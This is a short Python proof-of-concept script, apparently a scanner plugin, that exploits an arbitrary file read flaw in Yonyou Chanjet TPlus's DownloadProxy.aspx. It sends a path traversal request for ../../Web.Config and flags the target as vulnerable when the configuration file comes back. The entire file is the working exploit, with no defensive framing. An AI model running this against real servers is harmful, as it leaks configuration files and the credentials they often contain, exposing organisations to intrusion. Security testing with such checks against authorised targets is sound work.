import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'X-Ajaxpro-Method': 'GetStoreWarehouseByStore',
        'User-Agent': 'Java/1.8.0_381',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '<config' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult